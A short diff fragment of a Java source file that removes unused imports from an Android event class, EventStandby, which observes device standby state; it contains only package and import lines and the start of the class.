@@ -9,15 +9,10 @@
 
 package com.android.networking.event;
 
-import java.io.IOException;
-
 import com.android.networking.Standby;
-import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfEvent;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerStandby;
-import com.android.networking.util.Check;
-import com.android.networking.util.DataBuffer;
 
 public class EventStandby extends BaseEvent implements Observer<Standby> {
 	/** The Constant TAG. */
